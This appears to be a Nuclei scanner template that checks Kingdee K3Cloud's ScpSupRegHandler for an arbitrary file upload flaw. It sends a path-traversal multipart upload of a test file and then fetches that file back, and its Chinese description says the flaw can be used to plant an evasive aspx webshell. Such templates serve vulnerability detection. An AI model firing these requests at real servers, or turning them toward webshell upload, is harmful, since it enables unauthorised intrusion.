id: kingdee-ScpSupRegHandler-fileupload
info:
  name: kingdee-ScpSupRegHandler-fileupload
  author: apple
  severity: info
  description: 可上传aspx免杀马获取shell
  reference:
    - https://blog.csdn.net/qq_41904294/article/details/134319036
  tags: tags
http:
  - raw:
      - "POST /k3cloud/SRM/ScpSupRegHandler HTTP/1.1\nHost: {{Hostname}}\nUser-Agent:\
        \ Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0\n\
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\n\
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\n\
        Accept-Encoding: gzip, deflate, br\nConnection: keep-alive\nUpgrade-Insecure-Requests:\
        \ 1\nSec-Fetch-Dest: document\nSec-Fetch-Mode: navigate\nSec-Fetch-Site: none\n\
        Sec-Fetch-User: ?1\nContent-Type: multipart/form-data; boundary=2ac719f8e29343df94aa4ab49e456061\n\
        \ \n--2ac719f8e29343df94aa4ab49e456061\nContent-Disposition: form-data; name=\"\
        dbId_v\"\n \n.\n--2ac719f8e29343df94aa4ab49e456061\nContent-Disposition: form-data;\
        \ name=\"FID\"\n \n2023\n--2ac719f8e29343df94aa4ab49e456061\nContent-Disposition:\
        \ form-data; name=\"FAtt\"; filename=\"../../../../uploadfiles/1.txt\"\nContent-Type:\
        \ text/plain\n \ntest\n--2ac719f8e29343df94aa4ab49e456061--"
      - |
        GET /K3Cloud/uploadfiles/1.txt HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36
        Connection: close
        Accept-Encoding: gzip, deflate
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'test'
      - type: word
        part: body
        words:
          - '附件保存成功'
